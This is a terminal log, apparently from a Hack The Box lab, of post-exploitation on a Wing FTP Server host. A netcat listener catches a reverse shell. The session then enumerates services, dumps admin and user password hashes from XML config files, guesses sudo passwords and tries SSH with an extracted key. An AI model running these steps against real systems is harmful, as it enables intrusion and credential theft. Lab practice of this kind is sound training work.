@@ -1,0 +1,2020 @@
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nc -lvnp 4444       
+listening on [any] 4444 ...
+connect to [10.10.14.233] from (UNKNOWN) [10.129.16.172] 56514
+bash: cannot set terminal process group (3542): Inappropriate ioctl for device
+bash: no job control in this shell
+wingftp@wingdata:/opt/wftpserver$ ls
+ls
+Data
+License.txt
+Log
+lua
+pid-wftpserver.pid
+README
+session
+session_admin
+version.txt
+webadmin
+webclient
+wftpconsole
+wftp_default_ssh.key
+wftp_default_ssl.crt
+wftp_default_ssl.key
+wftpserver
+wingftp@wingdata:/opt/wftpserver$ sudo -l
+sudo -l
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+wingftp@wingdata:/opt/wftpserver$ sudo -l -S
+sudo -l -S
+[sudo] password for wingftp: c
+c
+Sorry, try again.
+[sudo] password for wingftp: c
+Sorry, try again.
+[sudo] password for wingftp: c
+sudo: 3 incorrect password attempts
+wingftp@wingdata:/opt/wftpserver$ c
+bash: c: command not found
+wingftp@wingdata:/opt/wftpserver$ ss -plunt
+ss -plunt
+Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                                                                                           
+udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*                                                                                                                                     
+tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                                                                                                     
+tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*                                                                                                                                     
+tcp   LISTEN 0      128          0.0.0.0:5466       0.0.0.0:*    users:(("ss",pid=3685,fd=8),("bash",pid=3677,fd=8),("bash",pid=3676,fd=8),("sh",pid=3675,fd=8),("wftpserver",pid=3542,fd=8))     
+tcp   LISTEN 0      128          0.0.0.0:42811      0.0.0.0:*    users:(("ss",pid=3685,fd=10),("bash",pid=3677,fd=10),("bash",pid=3676,fd=10),("sh",pid=3675,fd=10),("wftpserver",pid=3542,fd=10))
+tcp   LISTEN 0      128        127.0.0.1:8080       0.0.0.0:*    users:(("ss",pid=3685,fd=11),("bash",pid=3677,fd=11),("bash",pid=3676,fd=11),("sh",pid=3675,fd=11),("wftpserver",pid=3542,fd=11))
+tcp   LISTEN 0      128             [::]:22            [::]:*                                                                                                                                     
+tcp   LISTEN 0      128             [::]:5466          [::]:*    users:(("ss",pid=3685,fd=7),("bash",pid=3677,fd=7),("bash",pid=3676,fd=7),("sh",pid=3675,fd=7),("wftpserver",pid=3542,fd=7))     
+wingftp@wingdata:/opt/wftpserver$ curl -X "username=admin&password=test" http://127.0.0.1:5466/admin_loginok.html
+<word=test" http://127.0.0.1:5466/admin_loginok.html
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   288  100   288    0     0  16167      0 --:--:-- --:--:-- --:--:-- 16941
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="pragma" content="no-cache" />
+<meta http-equiv="cache-control" content="no-cache, must-revalidate" />
+<body>
+<script>alert('Login failed!');location='admin_login.html';</script>
+</body>
+</html>wingftp@wingdata:/opt/wftpserver$ ls     
+ls
+Data
+License.txt
+Log
+lua
+pid-wftpserver.pid
+README
+session
+session_admin
+version.txt
+webadmin
+webclient
+wftpconsole
+wftp_default_ssh.key
+wftp_default_ssl.crt
+wftp_default_ssl.key
+wftpserver
+wingftp@wingdata:/opt/wftpserver$ cd Log/_AD 
+cd Log/_AD
+bash: cd: Log/_AD: No such file or directory
+wingftp@wingdata:/opt/wftpserver$ ls
+ls
+Data
+License.txt
+Log
+lua
+pid-wftpserver.pid
+README
+session
+session_admin
+version.txt
+webadmin
+webclient
+wftpconsole
+wftp_default_ssh.key
+wftp_default_ssl.crt
+wftp_default_ssl.key
+wftpserver
+wingftp@wingdata:/opt/wftpserver$ cd Log
+cd Log
+wingftp@wingdata:/opt/wftpserver/Log$ ls
+ls
+Admin
+audit_db
+Domains
+ssh_debug_log
+System
+wingftp@wingdata:/opt/wftpserver/Log$ cd ../Data
+cd ../Data
+wingftp@wingdata:/opt/wftpserver/Data$ cd _ADMINISTRATOR    
+cd _ADMINISTRATOR
+wingftp@wingdata:/opt/wftpserver/Data/_ADMINISTRATOR$ ls
+ls
+admins.xml
+settings.xml
+wingftp@wingdata:/opt/wftpserver/Data/_ADMINISTRATOR$ cat admins.xml
+cat admins.xml
+<?xml version="1.0" ?>
+<ADMIN_ACCOUNTS Description="Wing FTP Server Admin Accounts">
+    <ADMIN>
+        <Admin_Name>admin</Admin_Name>
+        <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
+        <Type>0</Type>
+        <Readonly>0</Readonly>
+        <IsDomainAdmin>0</IsDomainAdmin>
+        <DomainList></DomainList>
+        <MyDirectory></MyDirectory>
+        <EnableTwoFactor>0</EnableTwoFactor>
+        <TwoFactorCode></TwoFactorCode>
+    </ADMIN>
+</ADMIN_ACCOUNTS>
+wingftp@wingdata:/opt/wftpserver/Data/_ADMINISTRATOR$ curl -X "username=admin&password=a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba" http://127.0.0.1:5466/admin_loginok.html
+<2193bafba" http://127.0.0.1:5466/admin_loginok.html  
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   288  100   288    0     0  36212      0 --:--:-- --:--:-- --:--:-- 41142
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="pragma" content="no-cache" />
+<meta http-equiv="cache-control" content="no-cache, must-revalidate" />
+<body>
+<script>alert('Login failed!');location='admin_login.html';</script>
+</body>
+</html>wingftp@wingdata:/opt/wftpserver/Data/_ADMINISTRATOR$ cd ..
+cd ..
+wingftp@wingdata:/opt/wftpserver/Data$ ls
+ls
+1
+_ADMINISTRATOR
+bookmark_db
+settings.xml
+ssh_host_ecdsa_key
+ssh_host_key
+wingftp@wingdata:/opt/wftpserver/Data$ ls -la
+ls -la
+total 40
+drwxr-x--- 4 wingftp wingftp  4096 Apr  2 19:55 .
+drwxr-x--- 9 wingftp wingftp  4096 Apr  2 19:55 ..
+drwxr-x--- 4 wingftp wingftp  4096 Feb  9 08:19 1
+drwxr-x--- 2 wingftp wingftp  4096 Apr  2 19:55 _ADMINISTRATOR
+-rw------- 1 wingftp wingftp 11264 Nov  2 11:11 bookmark_db
+-rwxr-x--- 1 wingftp wingftp  2554 Nov  2 16:23 settings.xml
+-rwxr-x--- 1 wingftp wingftp   241 Nov  2 11:12 ssh_host_ecdsa_key
+-rw-rw-rw- 1 wingftp wingftp  3272 Nov  2 11:52 ssh_host_key
+wingftp@wingdata:/opt/wftpserver/Data$ cd 1
+cd 1
+wingftp@wingdata:/opt/wftpserver/Data/1$ ls
+ls
+groups
+portlistener.xml
+settings.xml
+users
+wingftp@wingdata:/opt/wftpserver/Data/1$ cd users
+cd users
+wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls
+ls
+anonymous.xml
+john.xml
+maria.xml
+steve.xml
+wacky.xml
+wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml
+cat wacky.xml
+<?xml version="1.0" ?>
+<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
+    <USER>
+        <UserName>wacky</UserName>
+        <EnableAccount>1</EnableAccount>
+        <EnablePassword>1</EnablePassword>
+        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
+        <ProtocolType>63</ProtocolType>
+        <EnableExpire>0</EnableExpire>
+        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
+        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
+        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
+        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
+        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
+        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
+        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
+        <MaxConnection>0</MaxConnection>
+        <ConnectionPerIp>0</ConnectionPerIp>
+        <PasswordLength>0</PasswordLength>
+        <ShowHiddenFile>0</ShowHiddenFile>
+        <CanChangePassword>0</CanChangePassword>
+        <CanSendMessageToServer>0</CanSendMessageToServer>
+        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
+        <SSHPublicKeyPath></SSHPublicKeyPath>
+        <SSHAuthMethod>0</SSHAuthMethod>
+        <EnableWeblink>1</EnableWeblink>
+        <EnableUplink>1</EnableUplink>
+        <EnableTwoFactor>0</EnableTwoFactor>
+        <TwoFactorCode></TwoFactorCode>
+        <ExtraInfo></ExtraInfo>
+        <CurrentCredit>0</CurrentCredit>
+        <RatioDownload>1</RatioDownload>
+        <RatioUpload>1</RatioUpload>
+        <RatioCountMethod>0</RatioCountMethod>
+        <EnableRatio>0</EnableRatio>
+        <MaxQuota>0</MaxQuota>
+        <CurrentQuota>0</CurrentQuota>
+        <EnableQuota>0</EnableQuota>
+        <NotesName></NotesName>
+        <NotesAddress></NotesAddress>
+        <NotesZipCode></NotesZipCode>
+        <NotesPhone></NotesPhone>
+        <NotesFax></NotesFax>
+        <NotesEmail></NotesEmail>
+        <NotesMemo></NotesMemo>
+        <EnableUploadLimit>0</EnableUploadLimit>
+        <CurLimitUploadSize>0</CurLimitUploadSize>
+        <MaxLimitUploadSize>0</MaxLimitUploadSize>
+        <EnableDownloadLimit>0</EnableDownloadLimit>
+        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
+        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
+        <LimitResetType>0</LimitResetType>
+        <LimitResetTime>1762103089</LimitResetTime>
+        <TotalReceivedBytes>0</TotalReceivedBytes>
+        <TotalSentBytes>0</TotalSentBytes>
+        <LoginCount>2</LoginCount>
+        <FileDownload>0</FileDownload>
+        <FileUpload>0</FileUpload>
+        <FailedDownload>0</FailedDownload>
+        <FailedUpload>0</FailedUpload>
+        <LastLoginIp>127.0.0.1</LastLoginIp>
+        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
+        <EnableSchedule>0</EnableSchedule>
+    </USER>
+</USER_ACCOUNTS>
+wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat ../../_ADMINISTRATOR/settings.xml
+<Data/1/users$ cat ../../_ADMINISTRATOR/settings.xml
+<?xml version="1.0" ?>
+<Administrator Description="Wing FTP Server Administrator Options">
+    <HttpPort>5466</HttpPort>
+    <HttpSecure>0</HttpSecure>
+    <AdminLogfileEnable>1</AdminLogfileEnable>
+    <AdminLogfileFileName>Admin-%Y-%M-%D.log</AdminLogfileFileName>
+    <AdminLogfileMaxsize>0</AdminLogfileMaxsize>
+    <EnablePortUPnP>0</EnablePortUPnP>
+</Administrator>
+wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls
+ls
+anonymous.xml
+john.xml
+maria.xml
+steve.xml
+wacky.xml
+wingftp@wingdata:/opt/wftpserver/Data/1/users$ cd ..
+cd ..
+wingftp@wingdata:/opt/wftpserver/Data/1$ ls
+ls
+groups
+portlistener.xml
+settings.xml
+users
+wingftp@wingdata:/opt/wftpserver/Data/1$ cat settings.xml
+cat settings.xml
+<?xml version="1.0" ?>
+<DOMAIN_OPTION Description="Wing FTP Server Domain settings">
+    <Domain_Max_Session>0</Domain_Max_Session>
+    <Domain_Per_Ip_Max_Session>0</Domain_Per_Ip_Max_Session>
+    <Per_Session_Max_Download_Speed>0</Per_Session_Max_Download_Speed>
+    <Per_Session_Max_Upload_Speed>0</Per_Session_Max_Upload_Speed>
+    <Domain_Max_Download_Speed>0</Domain_Max_Download_Speed>
+    <Domain_Max_Upload_Speed>0</Domain_Max_Upload_Speed>
+    <Per_User_Max_Download_Speed>0</Per_User_Max_Download_Speed>
+    <Per_User_Max_Upload_Speed>0</Per_User_Max_Upload_Speed>
+    <Passive_Type>0</Passive_Type>
+    <Pasv_Ip_Refresh_Interval>60</Pasv_Ip_Refresh_Interval>
+    <Fixed_Ip></Fixed_Ip>
+    <Web_Ip>http://ip.wftpserver.com/w/getIP.php</Web_Ip>
+    <DNS_Ip></DNS_Ip>
+    <Enable_UPnP_For_Passive_Ports>0</Enable_UPnP_For_Passive_Ports>
+    <Min_Passive_Port>1024</Min_Passive_Port>
+    <Max_Passive_Port>1124</Max_Passive_Port>
+    <Transfer_Buffer_Size>65535</Transfer_Buffer_Size>
+    <Userdata_Access_Style>1</Userdata_Access_Style>
+    <MYSQL_Address>localhost</MYSQL_Address>
+    <MYSQL_Port>3306</MYSQL_Port>
+    <MYSQL_Username>root</MYSQL_Username>
+    <MYSQL_Password></MYSQL_Password>
+    <MYSQL_DatabaseName>wftp_database</MYSQL_DatabaseName>
+    <MYSQL_UnixSocket></MYSQL_UnixSocket>
+    <ODBC_DSN_Address></ODBC_DSN_Address>
+    <ODBC_DSN_Username></ODBC_DSN_Username>
+    <ODBC_DSN_Password></ODBC_DSN_Password>
+    <Enable_Mode_Z_support>0</Enable_Mode_Z_support>
+    <Default_Compression_level>8</Default_Compression_level>
+    <Min_Compression_level>1</Min_Compression_level>
+    <Max_Compression_level>9</Max_Compression_level>
+    <Enable_SFV_Check>0</Enable_SFV_Check>
+    <SFV_Check_Create_Missing>0</SFV_Check_Create_Missing>
+    <SFV_Check_Bad_File>0</SFV_Check_Bad_File>
+    <SFV_Check_Create_Progress>0</SFV_Check_Create_Progress>
+    <SFV_Check_Send_Result>0</SFV_Check_Send_Result>
+    <Anti_Hammer_Enable>1</Anti_Hammer_Enable>
+    <Anti_Hammer_Block_Time>180</Anti_Hammer_Block_Time>
+    <Anti_Hammer_Login_Failed_Counts>10</Anti_Hammer_Login_Failed_Counts>
+    <Anti_Hammer_Interval>90</Anti_Hammer_Interval>
+    <Anti_Hammer_Send_Message>0</Anti_Hammer_Send_Message>
+    <SSL_Name>wftp_default_ssl</SSL_Name>
+    <SSH_Name>wftp_default_ssh</SSH_Name>
+    <SSH_Use_UTF8>1</SSH_Use_UTF8>
+    <SMTP_Name></SMTP_Name>
+    <Enable_FXP>0</Enable_FXP>
+    <Enable_WebLink>0</Enable_WebLink>
+    <Enable_Logfile>1</Enable_Logfile>
+    <Logfile_Name>%Y-%M-%D.log</Logfile_Name>
+    <Logfile_Maxsize>512000</Logfile_Maxsize>
+    <Message_Log_File_Enable>1</Message_Log_File_Enable>
+    <Message_Log_Scrn_Enable>1</Message_Log_Scrn_Enable>
+    <Security_Log_File_Enable>1</Security_Log_File_Enable>
+    <Security_Log_Scrn_Enable>1</Security_Log_Scrn_Enable>
+    <FTP_Command_Log_File_Enable>1</FTP_Command_Log_File_Enable>
+    <FTP_Command_Log_Scrn_Enable>1</FTP_Command_Log_Scrn_Enable>
+    <FTP_Response_Log_File_Enable>1</FTP_Response_Log_File_Enable>
+    <FTP_Response_Log_Scrn_Enable>1</FTP_Response_Log_Scrn_Enable>
+    <WEB_Command_Log_File_Enable>1</WEB_Command_Log_File_Enable>
+    <WEB_Command_Log_Scrn_Enable>1</WEB_Command_Log_Scrn_Enable>
+    <WEB_Response_Log_File_Enable>1</WEB_Response_Log_File_Enable>
+    <WEB_Response_Log_Scrn_Enable>1</WEB_Response_Log_Scrn_Enable>
+    <SSH_Command_Log_File_Enable>1</SSH_Command_Log_File_Enable>
+    <SSH_Command_Log_Scrn_Enable>1</SSH_Command_Log_Scrn_Enable>
+    <SSH_Response_Log_File_Enable>1</SSH_Response_Log_File_Enable>
+    <SSH_Response_Log_Scrn_Enable>1</SSH_Response_Log_Scrn_Enable>
+    <ODBC_Error_Log_File_Enable>1</ODBC_Error_Log_File_Enable>
+    <ODBC_Error_Log_Scrn_Enable>1</ODBC_Error_Log_Scrn_Enable>
+    <MYSQL_Error_Log_File_Enable>1</MYSQL_Error_Log_File_Enable>
+    <MYSQL_Error_Log_Scrn_Enable>1</MYSQL_Error_Log_Scrn_Enable>
+    <LUA_Error_Log_File_Enable>1</LUA_Error_Log_File_Enable>
+    <LUA_Error_Log_Scrn_Enable>1</LUA_Error_Log_Scrn_Enable>
+    <Mail_Error_Log_File_Enable>1</Mail_Error_Log_File_Enable>
+    <Mail_Error_Log_Scrn_Enable>1</Mail_Error_Log_Scrn_Enable>
+    <File_Error_Log_File_Enable>1</File_Error_Log_File_Enable>
+    <File_Error_Log_Scrn_Enable>1</File_Error_Log_Scrn_Enable>
+    <Normal_Error_Log_File_Enable>1</Normal_Error_Log_File_Enable>
+    <Normal_Error_Log_Scrn_Enable>1</Normal_Error_Log_Scrn_Enable>
+    <Message_Welcome>%ServerName ready...</Message_Welcome>
+    <Message_Login>User %Name logged in.</Message_Login>
+    <Message_Change_Dir>CWD command ok. &quot;%Dir&quot; is current directory.</Message_Change_Dir>
+    <Message_Dir_List>Transfer ok.</Message_Dir_List>
+    <Message_File_Upload>File received ok. Transferred:%ConTransferBytes;Average speed is:%ConTransferSpeedKBS</Message_File_Upload>
+    <Message_File_Download>File sent ok. Transferred:%ConTransferBytes;Average speed is:%ConTransferSpeedKBS</Message_File_Download>
+    <Message_System_Command>UNIX Type: L8</Message_System_Command>
+    <Message_Quit_Command>Goodbye.</Message_Quit_Command>
+    <Enable_UPnP_For_Listener_Ports>0</Enable_UPnP_For_Listener_Ports>
+    <Max_Number_Sessions_Per_User_Account>0</Max_Number_Sessions_Per_User_Account>
+    <Max_Sessions_Per_Ip_For_User_Account>0</Max_Sessions_Per_Ip_For_User_Account>
+    <Command_Timeout_Min>5</Command_Timeout_Min>
+    <Enable_Domain_Logo>0</Enable_Domain_Logo>
+    <Transfer_Timeout_Minutes>5</Transfer_Timeout_Minutes>
+    <ADUser_Enable>0</ADUser_Enable>
+    <ADUser_Domain></ADUser_Domain>
+    <ADUser_Directory></ADUser_Directory>
+    <ADUser_Enable_OwnDir>0</ADUser_Enable_OwnDir>
+    <ADUser_Enable_FileRead>1</ADUser_Enable_FileRead>
+    <ADUser_Enable_FileWrite>0</ADUser_Enable_FileWrite>
+    <ADUser_Enable_FileAppend>0</ADUser_Enable_FileAppend>
+    <ADUser_Enable_FileDelete>0</ADUser_Enable_FileDelete>
+    <ADUser_Enable_DirRename>0</ADUser_Enable_DirRename>
+    <ADUser_Enable_DirList>1</ADUser_Enable_DirList>
+    <ADUser_Enable_DirCreate>0</ADUser_Enable_DirCreate>
+    <ADUser_Enable_DirDelete>0</ADUser_Enable_DirDelete>
+    <ADUser_Enable_FileRename>0</ADUser_Enable_FileRename>
+    <ADUser_Enable_ZipFile>0</ADUser_Enable_ZipFile>
+    <ADUser_Enable_UnzipFile>0</ADUser_Enable_UnzipFile>
+    <ADUser_User_Mapping>ADUser001:LocalUser001&#x0A;ADUser002:LocalUser002</ADUser_User_Mapping>
+    <LDAP_Enable>0</LDAP_Enable>
+    <LDAP_Host>localhost</LDAP_Host>
+    <LDAP_Port>389</LDAP_Port>
+    <LDAP_UseSSL>0</LDAP_UseSSL>
+    <LDAP_BindDN></LDAP_BindDN>
+    <LDAP_BindPass></LDAP_BindPass>
+    <LDAP_BaseDN></LDAP_BaseDN>
+    <LDAP_Filter>(&amp;(objectClass=posixAccount)(uid=%s))</LDAP_Filter>
+    <LDAP_Directory></LDAP_Directory>
+    <LDAP_Enable_OwnDir>0</LDAP_Enable_OwnDir>
+    <LDAP_Enable_FileRead>1</LDAP_Enable_FileRead>
+    <LDAP_Enable_FileWrite>0</LDAP_Enable_FileWrite>
+    <LDAP_Enable_FileAppend>0</LDAP_Enable_FileAppend>
+    <LDAP_Enable_FileDelete>0</LDAP_Enable_FileDelete>
+    <LDAP_Enable_DirRename>0</LDAP_Enable_DirRename>
+    <LDAP_Enable_DirList>1</LDAP_Enable_DirList>
+    <LDAP_Enable_DirCreate>0</LDAP_Enable_DirCreate>
+    <LDAP_Enable_DirDelete>0</LDAP_Enable_DirDelete>
+    <LDAP_Enable_FileRename>0</LDAP_Enable_FileRename>
+    <LDAP_Enable_ZipFile>0</LDAP_Enable_ZipFile>
+    <LDAP_Enable_UnzipFile>0</LDAP_Enable_UnzipFile>
+    <LDAP_User_Mapping>LDAPUser001:LocalUser001&#x0A;LDAPUser002:LocalUser002</LDAP_User_Mapping>
+    <LDAP_Group_Mapping>CN=ADGroup1,CN=Builtin,DC=wftpserver,DC=com:LocalUser1&#x0A;CN=ADGroup2,CN=Builtin,DC=wftpserver,DC=com:LocalUser2</LDAP_Group_Mapping>
+    <LDAP_Version>3</LDAP_Version>
+    <LDAP_Dir_Lowercase>0</LDAP_Dir_Lowercase>
+    <WebLink_Speed>0</WebLink_Speed>
+    <LIST_TIME_GMT>1</LIST_TIME_GMT>
+    <Logfile_Compress>1</Logfile_Compress>
+    <Enable_UTF8_ON>1</Enable_UTF8_ON>
+    <Enable_AUTH_ON>1</Enable_AUTH_ON>
+    <Use_LANIP_For_LAN_Client_Passive>1</Use_LANIP_For_LAN_Client_Passive>
+    <Min_Password_Length>0</Min_Password_Length>
+    <Password_Have_Numerals>0</Password_Have_Numerals>
+    <Password_Have_Lowercase>0</Password_Have_Lowercase>
+    <Password_Have_Uppercase>0</Password_Have_Uppercase>
+    <Password_Have_Nonalphanumeric>0</Password_Have_Nonalphanumeric>
+    <Enable_NTFS_Permission>0</Enable_NTFS_Permission>
+    <EnableSHA256>1</EnableSHA256>
+    <Enable_HTTPS_Redirect>0</Enable_HTTPS_Redirect>
+    <HTTPS_Redirect_Port>443</HTTPS_Redirect_Port>
+    <Change_Password_Firstlogon>0</Change_Password_Firstlogon>
+    <Enable_UploadLink>0</Enable_UploadLink>
+    <UploadLink_Speed>0</UploadLink_Speed>
+    <Additional_HTTP_Headers></Additional_HTTP_Headers>
+    <Allow_Passive_Active_Mode>2</Allow_Passive_Active_Mode>
+    <Passive_Listener_Timeout>30</Passive_Listener_Timeout>
+    <Auto_Passive_Port_Forward>0</Auto_Passive_Port_Forward>
+    <MYSQL_Set_UTF8>1</MYSQL_Set_UTF8>
+    <Enable_Domain>1</Enable_Domain>
+    <Auto_Active_Port_Forward>0</Auto_Active_Port_Forward>
+    <Weblink_URL></Weblink_URL>
+    <Enable_Symbolic_Link>0</Enable_Symbolic_Link>
+    <Enable_Welcome_Message>0</Enable_Welcome_Message>
+    <Welcome_Message></Welcome_Message>
+    <Keep_Old_Weblink>0</Keep_Old_Weblink>
+    <Uplink_Overwrite_File>0</Uplink_Overwrite_File>
+    <SSH_Banner>WingFTPServer</SSH_Banner>
+    <HTTP_KeepAlive>1</HTTP_KeepAlive>
+    <Enable_Weblink_Subfolder>0</Enable_Weblink_Subfolder>
+    <TLS_Session_Timeout>3600</TLS_Session_Timeout>
+    <EnablePasswordSalting>1</EnablePasswordSalting>
+    <SaltingString>WingFTP</SaltingString>
+    <Enable_Log_Millisecond>0</Enable_Log_Millisecond>
+    <LDAP_Mapping_CaseInsensitive>0</LDAP_Mapping_CaseInsensitive>
+    <LDAP_Timeout>10</LDAP_Timeout>
+    <Keep_Anonymous_Weblink>0</Keep_Anonymous_Weblink>
+    <Transfer_Limit>
+        <Transfer_Limit_Enable>0</Transfer_Limit_Enable>
+        <Transfer_Limit_Reset>0</Transfer_Limit_Reset>
+        <Transfer_Limit_Reset_Time>0</Transfer_Limit_Reset_Time>
+        <Enable_Upload_Limit_Never>0</Enable_Upload_Limit_Never>
+        <Current_Upload_Size_Never>0</Current_Upload_Size_Never>
+        <Max_Upload_Size_Never>0</Max_Upload_Size_Never>
+        <Enable_Download_Limit_Never>0</Enable_Download_Limit_Never>
+        <Current_Download_Size_Never>0</Current_Download_Size_Never>
+        <Max_Download_Size_Never>0</Max_Download_Size_Never>
+        <Enable_Upload_Limit_Hourly>0</Enable_Upload_Limit_Hourly>
+        <Current_Upload_Size_Hourly>0</Current_Upload_Size_Hourly>
+        <Max_Upload_Size_Hourly>0</Max_Upload_Size_Hourly>
+        <Enable_Download_Limit_Hourly>0</Enable_Download_Limit_Hourly>
+        <Current_Download_Size_Hourly>0</Current_Download_Size_Hourly>
+        <Max_Download_Size_Hourly>0</Max_Download_Size_Hourly>
+        <Enable_Upload_Limit_Daily>0</Enable_Upload_Limit_Daily>
+        <Current_Upload_Size_Daily>0</Current_Upload_Size_Daily>
+        <Max_Upload_Size_Daily>0</Max_Upload_Size_Daily>
+        <Enable_Download_Limit_Daily>0</Enable_Download_Limit_Daily>
+        <Current_Download_Size_Daily>0</Current_Download_Size_Daily>
+        <Max_Download_Size_Daily>0</Max_Download_Size_Daily>
+        <Enable_Upload_Limit_Weekly>0</Enable_Upload_Limit_Weekly>
+        <Current_Upload_Size_Weekly>0</Current_Upload_Size_Weekly>
+        <Max_Upload_Size_Weekly>0</Max_Upload_Size_Weekly>
+        <Enable_Download_Limit_Weekly>0</Enable_Download_Limit_Weekly>
+        <Current_Download_Size_Weekly>0</Current_Download_Size_Weekly>
+        <Max_Download_Size_Weekly>0</Max_Download_Size_Weekly>
+        <Enable_Upload_Limit_Monthly>0</Enable_Upload_Limit_Monthly>
+        <Current_Upload_Size_Monthly>0</Current_Upload_Size_Monthly>
+        <Max_Upload_Size_Monthly>0</Max_Upload_Size_Monthly>
+        <Enable_Download_Limit_Monthly>0</Enable_Download_Limit_Monthly>
+        <Current_Download_Size_Monthly>0</Current_Download_Size_Monthly>
+        <Max_Download_Size_Monthly>0</Max_Download_Size_Monthly>
+    </Transfer_Limit>
+</DOMAIN_OPTION>
+wingftp@wingdata:/opt/wftpserver/Data/1$ mysql -u root -p 3306
+mysql -u root -p 3306
+bash: mysql: command not found
+wingftp@wingdata:/opt/wftpserver/Data/1$ 
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano wingftp.key
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh wingftp@wingdata.htb -i wingftp.key 
+The authenticity of host 'wingdata.htb (10.129.16.163)' can't be established.
+ED25519 key fingerprint is: SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'wingdata.htb' (ED25519) to the list of known hosts.
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0664 for 'wingftp.key' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "wingftp.key": bad permissions
+wingftp@wingdata.htb's password: 
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ chmod 600 wingftp.key 
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh wingftp@wingdata.htb -i wingftp.key
+wingftp@wingdata.htb's password: 
+
+                                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh wingftp@wingdata.htb -i wingftp.key -v 
+debug1: OpenSSH_10.2p1 Debian-2, OpenSSL 3.5.5 27 Jan 2026
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to wingdata.htb [10.129.16.163] port 22.
+debug1: Connection established.
+debug1: no pubkey loaded from wingftp.key
+debug1: identity file wingftp.key type -1
+debug1: no identity pubkey loaded from wingftp.key
+debug1: Local version string SSH-2.0-OpenSSH_10.2p1 Debian-2
+debug1: Remote protocol version 2.0, remote software version OpenSSH_9.2p1 Debian-2+deb12u7
+debug1: compat_banner: match: OpenSSH_9.2p1 Debian-2+deb12u7 pat OpenSSH* compat 0x04000000
+debug1: Authenticating to wingdata.htb:22 as 'wingftp'
+debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: sntrup761x25519-sha512
+debug1: kex: host key algorithm: ssh-ed25519
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: SSH2_MSG_KEX_ECDH_REPLY received
+debug1: Server host key: ssh-ed25519 SHA256:JacnW6dsEmtRtwu2ULpY/CK8n/8M9tU+6pQhjBG3a4w
+debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: Host 'wingdata.htb' is known and matches the ED25519 host key.
+debug1: Found key in /home/kali/.ssh/known_hosts:11
+debug1: ssh_packet_send2_wrapped: resetting send seqnr 3
+debug1: rekey out after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: ssh_packet_read_poll2: resetting read seqnr 3
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey in after 134217728 blocks
+debug1: SSH2_MSG_EXT_INFO received
